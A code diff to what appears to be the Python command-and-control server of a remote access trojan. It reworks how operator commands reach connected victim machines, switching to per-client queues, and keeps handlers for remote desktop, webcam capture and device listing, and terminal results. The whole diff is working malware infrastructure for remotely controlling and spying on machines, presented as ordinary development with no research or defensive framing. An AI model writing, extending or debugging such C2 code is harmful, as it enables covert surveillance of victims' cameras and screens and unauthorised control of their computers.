@@ -845,18 +845,30 @@ def c2_websocket(ws):
             ''', (client_id, owner_id, hostname, username, ip))
             db.commit()
 
+        cmd_q = queue.Queue()
+
         with ws_clients_lock:
             ws_clients[client_id] = {
                 'ws': ws, 'hostname': hostname, 'username': username,
-                'ip': ip, 'user_id': owner_id
+                'ip': ip, 'user_id': owner_id, 'cmd_queue': cmd_q
             }
 
-        ws.send(json.dumps({'type': 'auth_ok'}))
+        ws.send(json.dumps({'type': 'auth_ok'}, separators=(',', ':')))
 
+        last_ping = time.time()
         while True:
-            data = ws.receive(timeout=30)
+            # drain pending commands first
+            while not cmd_q.empty():
+                try:
+                    ws.send(cmd_q.get_nowait())
+                except queue.Empty:
+                    break
+
+            data = ws.receive(timeout=2)
             if data is None:
-                ws.send('{"type":"ping"}')
+                if time.time() - last_ping > 25:
+                    ws.send('{"type":"ping"}')
+                    last_ping = time.time()
                 continue
             if isinstance(data, bytes):
                 if len(data) > 1 and data[0] == 0x43:  # 'C' = Camera
@@ -969,17 +981,14 @@ def c2_send_command():
     if not wsc:
         return jsonify({'error': 'client offline'}), 404
 
-    try:
-        wsc['ws'].send(json.dumps({'type': 'command', 'command': command}))
-        if command.startswith('rdp_start'):
-            with rdp_frames_lock:
-                rdp_frames[client_id] = {'data': b'', 'ts': time.time()}
-        elif command.startswith('camera_start'):
-            with camera_frames_lock:
-                camera_frames[client_id] = {'data': b'', 'ts': time.time()}
-        return jsonify({'success': True})
-    except Exception:
-        return jsonify({'error': 'send failed'}), 500
+    wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': command}, separators=(',', ':')))
+    if command.startswith('rdp_start'):
+        with rdp_frames_lock:
+            rdp_frames[client_id] = {'data': b'', 'ts': time.time()}
+    elif command.startswith('camera_start'):
+        with camera_frames_lock:
+            camera_frames[client_id] = {'data': b'', 'ts': time.time()}
+    return jsonify({'success': True})
 
 
 # ===== REMOTE DESKTOP FRAME ENDPOINT =====
@@ -1039,15 +1048,12 @@ def c2_get_camera_devices(client_id):
     with camera_devices_lock:
         devices = camera_devices.get(client_id)
     if devices is None:
-        # Request device list from client via WS
         with ws_clients_lock:
             wsc = ws_clients.get(client_id)
         if wsc:
-            try:
-                wsc['ws'].send(json.dumps({'type': 'command', 'command': 'camera_list'}))
-            except Exception:
-                pass
+            wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': 'camera_list'}, separators=(',', ':')))
         return jsonify([])
+    return jsonify(devices)
 @app.route('/api/c2/terminal_result/<client_id>')
 @login_required
 def c2_get_terminal_result(client_id):
